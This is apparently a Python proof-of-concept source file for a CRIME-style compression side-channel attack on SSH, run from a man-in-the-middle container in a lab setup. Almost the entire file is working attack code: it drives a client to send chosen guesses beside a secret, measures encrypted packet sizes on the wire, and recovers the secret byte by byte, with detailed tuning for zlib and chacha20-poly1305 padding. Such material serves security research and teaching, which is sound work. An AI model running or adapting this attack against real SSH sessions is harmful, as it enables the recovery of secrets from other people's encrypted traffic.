"""CRIME-style chosen-payload attack against SSH compression.

The PoC sits inside the attacker container and runs entirely passively
at the wire layer: it never decrypts SSH, never runs its own zlib, and
never asks the client for the secret value.  All it does is

  1. Trigger the client to push the secret onto its session channel
     (this refreshes the LZ77 sliding window so the secret sits at a
     known, *small*, near-constant distance for the next measurement).
  2. Trigger the client to send a chosen guess on the *other* session
     channel.  The two channels share one zlib compression context per
     direction, so the LZ77 dictionary populated by step 1 is visible
     to step 2.
  3. Read the size of the resulting encrypted SSH binary packet from
     the scapy AsyncSniffer running in the same container.

The right guess shares one extra byte with the secret in the LZ77
match-extension step, so its compressed payload is one byte smaller
than every wrong guess's.  chacha20-poly1305@openssh.com pads to
multiples of 8 bytes, so a 1-byte difference is invisible most of the
time -- but for at least one of the 8 possible alignments it crosses a
padding boundary and shows up as an 8-byte step on the wire.  We sweep
all 8 alignments by appending random noise of length 0..7 to each guess
and summing the wire sizes; the candidate with the smallest sum is the
recovered byte.

(This is the same idea as BREACH's "two tries" technique, tuned for
SSH BPP + chacha20-poly1305@openssh.com.)
"""

from __future__ import annotations

import asyncio
import logging
import os
import secrets
import time
from typing import Any

import aiohttp

LOG = logging.getLogger("attack")

CLIENT_BASE = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))


def _c2s_total(records: list[dict[str, Any]]) -> int:
    """Sum c->s TCP payload bytes from one half of the forwarder.

    The MitM relays each SSH binary packet through both legs of the
    proxy, so summing every TCP segment would double-count.  We pick
    the half-flow where dport == LISTEN_PORT (client -> attacker) and
    ignore the other side.  Also drops pure-ACK segments (payload=0).
    """
    return sum(
        r["tcp_payload_len"] for r in records
        if r["dport"] == LISTEN_PORT and r["tcp_payload_len"] > 0
    )


async def _refresh_secret(
    session: aiohttp.ClientSession,
    packet_log,
    settle: float,
) -> None:
    """Trigger the client to push the secret onto the secret channel.

    This refreshes the LZ77 sliding window so the secret sits at the
    *most recent* end of the dictionary.  We do it before every guess
    so the LZ77 distance for the prefix match is approximately the
    same for the right and wrong candidates -- the only signal we
    want is the +1 length advantage from the matching byte.
    """
    packet_log.clear()
    async with session.post(f"{CLIENT_BASE}/send_secret") as r:
        await r.read()
    if settle > 0:
        await asyncio.sleep(settle)


async def _measure(
    session: aiohttp.ClientSession,
    packet_log,
    payload: bytes,
    settle: float,
) -> int:
    """Trigger the client to send a payload, return total c->s wire bytes."""
    packet_log.clear()
    async with session.post(
        f"{CLIENT_BASE}/send_attacker_payload",
        data=payload,
    ) as r:
        await r.read()
    if settle > 0:
        await asyncio.sleep(settle)
    return _c2s_total(packet_log.snapshot())


# A constant byte (NUL is fine; the precise value doesn't matter as
# long as it doesn't carry attacker-meaningful structure) used as the
# flush filler.  Has to be sent as a single SSH BPP message so the
# attacker channel only contributes a known amount to the LZ77 input.
async def _flush_window(
    session: aiohttp.ClientSession,
    packet_log,
    flush_bytes: int,
    settle: float,
) -> None:
    """Push enough dummy bytes through the attacker channel to evict the
    prior guess from the LZ77 sliding window.

    The default zlib window is 32 KiB.  Once we've sent more than 32 KiB
    of input bytes since the previous guess, the previous guess is
    outside the window and the new guess can no longer match it as a
    long backreference -- only the (much shorter) match against the
    refreshed secret remains, and that's the only thing that should be
    competing for the candidate's match length.
    """
    if flush_bytes <= 0:
        return
    dummy = b"\x00" * flush_bytes
    async with session.post(
        f"{CLIENT_BASE}/send_attacker_payload",
        data=dummy,
    ) as r:
        await r.read()
    if settle > 0:
        await asyncio.sleep(settle)


def _make_noise(noise_len: int) -> bytes:
    """Build noise of `noise_len` bytes that sweeps the bit-alignment
    of the compressed output by exactly 1 bit per noise byte.

    Why 9-bit literals (bytes 144..255):
      * The right-vs-wrong compressed-bit delta is *not always* 8 bits.
        At length-code transitions in the DEFLATE fixed-Huffman length
        table the delta drops to 7 bits (e.g. length 10->11 spans codes
        264->265 which adds an extra bit in the wider code, eating one
        bit out of the literal-byte saving).  A 7-bit difference fits
        inside the Z_SYNC_FLUSH alignment slack at *some* bit positions
        and is invisible there.
      * To make the 7-bit signal cross a byte boundary at *some* noise
        length we need to vary the bit-alignment of the rest of the
        compressed payload.  An 8-bit literal adds 8 bits = 0 mod 8 so
        it doesn't change the alignment at all.  A 9-bit literal adds
        9 bits = 1 mod 8 so each one shifts the alignment by 1.
      * Eight 9-bit noise bytes therefore cycle through all 8 possible
        bit alignments and *guarantee* at least one of them exposes the
        7-bit compressed delta as a 1-byte byte delta.
      * Bytes 144..255 are all in the 9-bit fixed-Huffman literal code
        class.  We pick distinct bytes from 0xA0..0xAF (= 160..175) so
        no 3-byte intra-noise LZ77 match can form, and so the bytes
        don't appear in any plausible dictionary content (zeros,
        ASCII, IGNORE filler, SSH BPP wrappers).
    """
    if noise_len > 16:
        raise ValueError("noise_len too long for the 0xA0..0xAF slice")
    return bytes(range(0xA0, 0xA0 + noise_len))


async def crack_byte_position(
    session: aiohttp.ClientSession,
    packet_log,
    prefix: bytes,
    alphabet: list[bytes],
    noise_lengths: list[int],
    settle: float,
    flush_bytes: int,
    log_prefix: str,
) -> tuple[bytes, dict[bytes, int]]:
    """Recover one byte at the given position by candidate scoring."""
    sums: dict[bytes, int] = {c: 0 for c in alphabet}
    for noise_len in noise_lengths:
        # Strictly-linear non-matching noise -- see _make_noise() for
        # the rationale.  Same noise bytes for every candidate at this
        # length so the per-candidate comparison is fair.
        noise = _make_noise(noise_len)
        for cb in alphabet:
            # Step 1: flush the LZ77 window so the previous guess can't
            # be matched as a long backreference (which would swallow
            # the candidate signal -- the previous guess BPP message
            # is identical at every byte except the candidate byte, so
            # without flushing the new guess just back-references the
            # entire previous guess and there's no signal left).
            await _flush_window(session, packet_log, flush_bytes, settle)
            # Step 2: refresh the secret so it sits at the most-recent
            # end of the (now-clean) dictionary, at a constant small
            # distance for both right and wrong candidates -- only the
            # +1 match-length advantage of the right candidate remains
            # as signal.
            await _refresh_secret(session, packet_log, settle)
            payload = prefix + cb + noise
            sums[cb] += await _measure(session, packet_log, payload, settle)

    ranked = sorted(sums.items(), key=lambda kv: kv[1])
    best, best_sum = ranked[0]
    second, second_sum = ranked[1]
    LOG.info(
        "%s best=%r sum=%d  2nd=%r sum=%d  margin=%d",
        log_prefix,
        best.decode("latin-1"), best_sum,
        second.decode("latin-1"), second_sum,
        second_sum - best_sum,
    )
    return best, sums


async def run_attack(
    packet_log,
    known_prefix: bytes,
    alphabet_str: str = "abcdefghijklmnopqrstuvwxyz0123456789",
    max_length: int = 32,
    noise_lengths: list[int] | None = None,
    terminator: bytes = b"\n",
    settle: float = 0.005,
    flush_bytes: int = 33000,
) -> dict[str, Any]:
    if noise_lengths is None:
        # 0..15 spans two chacha20-poly1305@openssh.com padding bins.
        # Even when zlib's Huffman alignment makes the compressed size
        # grow non-linearly with noise length (the strict +1 invariant
        # is only approximate -- some noise lengths add 0 or 2 bytes
        # depending on bit-packing slack), 16 distinct noise lengths
        # are enough to guarantee at least one alignment crossing for
        # any prefix length.
        noise_lengths = list(range(16))
    alphabet = [bytes([c]) for c in alphabet_str.encode("utf-8")]
    if terminator not in alphabet:
        alphabet.append(terminator)

    LOG.info(
        "starting attack: known_prefix=%r alphabet_size=%d noise_lengths=%s "
        "max_length=%d settle=%.3f flush_bytes=%d",
        known_prefix, len(alphabet), noise_lengths, max_length, settle,
        flush_bytes,
    )

    started = time.time()
    recovered = b""
    history: list[dict[str, Any]] = []
    timeout = aiohttp.ClientTimeout(total=600)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for pos in range(max_length):
            best, sums = await crack_byte_position(
                session, packet_log,
                prefix=known_prefix + recovered,
                alphabet=alphabet,
                noise_lengths=noise_lengths,
                settle=settle,
                flush_bytes=flush_bytes,
                log_prefix=f"pos {pos:2d}",
            )
            ranked = [
                (k.decode("latin-1"), v)
                for k, v in sorted(sums.items(), key=lambda kv: kv[1])
            ]
            history.append({
                "position": pos,
                "best": best.decode("latin-1"),
                "ranked": ranked[:6],  # top 6 to keep response small
            })
            if best == terminator:
                LOG.info("hit terminator at position %d -> done", pos)
                break
            recovered += best
            LOG.info("recovered so far: %r", recovered.decode("latin-1"))
        else:
            LOG.warning("hit max_length=%d without terminator", max_length)

    elapsed = time.time() - started
    LOG.info("attack done in %.1fs: recovered=%r",
             elapsed, recovered.decode("latin-1"))
    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
        "history": history,
    }
